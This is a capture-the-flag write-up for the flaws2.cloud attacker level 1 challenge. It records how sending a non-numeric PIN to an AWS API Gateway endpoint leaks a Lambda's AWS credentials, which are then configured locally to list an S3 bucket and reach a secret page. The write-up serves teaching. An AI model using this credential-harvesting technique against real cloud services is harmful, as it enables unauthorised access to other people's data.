+++
date = '2025-04-20T20:00:00+01:00'
draft = false
title = 'CTF - flaws2.cloud Attacker Level 1'
author = 'B. Motyl'
tags = ["IT", "Security", "CTF", "flaws2.cloud"]
+++

## Abstract
In the <flaws2.cloud> Capture The FLag (CTF) attacker level 1
challenge, participants must bypass a 100 digit PIN requirement to
progress.  This document is a report of a an attempt to solve the
mentioned CTF level.  It provides an overview of the methods and 
steps taken to achieve the solution.


## Status of This Memo
This document is published for informational purposes.  It serves
as a recorded reference for the author's attempt, helping to retain
the steps taken.  Additionally, it can be used as a guideline for
presentations or as a teaching resource to help other teams learn
the concepts and techniques involved in solving this CTF.

## Copyright Notice
This document is licensed under the Creative Commons Attribution 4.0
International License (CC BY 4.0).

## Table of Contents
{{< toc >}}

## 1. Information Gathering - Hosting

Destination <level1.flaws2.cloud> was pinged in attempt to find more
clues.

```
ping -c 3 level1.flaws2.cloud
```

```
PING level1.flaws2.cloud (52.217.66.171) 56(84) bytes of data.
64 bytes from s3-website-us-east-1.amazonaws.com (52.217.66.171): icmp_seq=1 ttl=234 time=110 ms
64 bytes from s3-website-us-east-1.amazonaws.com (52.217.66.171): icmp_seq=2 ttl=234 time=133 ms

--- level1.flaws2.cloud ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2001ms
rtt min/avg/max/mdev = 109.742/121.539/133.337/11.797 ms

```
In a result of pinging, obtained <s3-website-us-east-1.amazonaws
.com> gives information that:
	- website is hosted on s3 bucket,
	- region is us-east-1.


## 2. Information Gathering - Website's Code

Using curl to see source code of the website.

```
curl -X GET level1.flaws2.cloud
```
```
...
<form name="myForm" 
action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" 
onsubmit="return validateForm()">
...
```

URL <https\://2rfismmoo8.execute-api.us-east-1.amazonaws.com/
default/level1> has been observed.  URL structure indicated AWS API
Gateway, as it has following structure <https\://api-id.execute-api.
region.amazonaws.com/stage/>.  Structure is stated in the provided
source <https\://docs.aws.amazon.com/apigateway/latest/
developerguide/how-to-call-api.html>.  Dissecting URL shows that API 
ID is "2rfismmoo8", region is "us-east-1", and stage is "level1".

## 3. [Failed] Exploitation of Excessive Privileges

Attempt to access resources using aws cli v2 and random or no
credentials was unsuccessful.
```
aws s3 ls s3://level1.flaws2.cloud --region us-east-1 --no-sign-request
aws apigateway get-resources --rest-api-id 2rfismmoo8 --region us-east-1
aws apigateway get-stage --rest-api-id 2rfismmoo8 --stage-name default --region us-east-1
aws apigateway get-method --rest-api-id 2rfismmoo8 --resource-id level1 --http-method GET --region us-east-1
```
```
An error occurred (AccessDenied) when calling the ListObjectsV2...
An error occurred (AccessDeniedException) when calling the GetResources...
An error occurred (AccessDeniedException) when calling the GetStage...
An error occurred (AccessDeniedException) when calling the GetMethod
```

## 4. [Succeeded] Sending Invalid Input

Attemp to call AWS API Gateway resource directly results in 301
redirect.
```
curl -i  https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234
```
```
HTTP/2 301
...
location: http://level1.flaws2.cloud/index.htm?incorrect
...
x-amz-apigw-id: HH8hfFAXIAMEUAw=
```

Note "x-amz-apigw-id" header, it is not id of API Gateway, notice
when calling it again will result in a different value.
```
curl -i  https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234
```
```
HTTP/2 301 
...
location: http://level1.flaws2.cloud/index.htm?incorrect
...
x-amz-apigw-id: HH9UPFV1oAMETtw=
...
```

Challenge mentions pin.  An attempt to send something different than
number.
```
curl -i  https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a
```
More data is returned, including aws credentials and name of a
lambda.
```
{
  "AWS_ACCESS_KEY_ID": "ASI...,
	"AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/level1",
  "AWS_LAMBDA_FUNCTION_NAME": "level1",
	"AWS_SESSION_TOKEN": "IQo...	
	"AWS_SECRET_ACCESS_KEY": "e7J...
	"AWS_DEFAULT_REGION": "us-east-1",
	...
}
```

## 5. Capturing The Flag

Configuring credentials.

```
vim ~/.aws/credentials
```
```
[default]
aws_access_key_id = ASI...
aws_secret_access_key = e7J...
aws_session_token = IQo...
```

Checking credentials.
```
aws sts get-caller-identity
```
```
{
    "UserId": "ARO...:level1",
    "Account": "653...",
    "Arn": "arn:aws:sts::653...:assumed-role/level1/level1"
}
```

Attempt to list lambdas fails.
```
aws lambda list-functions --region us-east-1
```
```
An error occurred (AccessDeniedException) when calling the ListFunctions...
```

Attempt to list s3 buckets fails.
```
aws s3 ls
```

```
An error occurred (AccessDenied) when calling the ListBuckets...
```

Attempt to list level1 s3 bucket succeeds.
```
aws s3 ls s3://level1.flaws2.cloud --region us-east-1
```
```
                           PRE img/
2018-11-20 21:55:05      17102 favicon.ico
2018-11-21 03:00:22       1905 hint1.htm
2018-11-21 03:00:22       2226 hint2.htm
2018-11-21 03:00:22       2536 hint3.htm
2018-11-21 03:00:23       2460 hint4.htm
2018-11-21 03:00:17       3000 index.htm
2018-11-21 03:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

Get page <http\://level1.flaws2.cloud/
secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html>
```
curl level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```
```
...
The next level is at <a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud">http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</a>
...
```

Next level is at <http\://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.
flaws2.cloud>

{{</ toc >}}
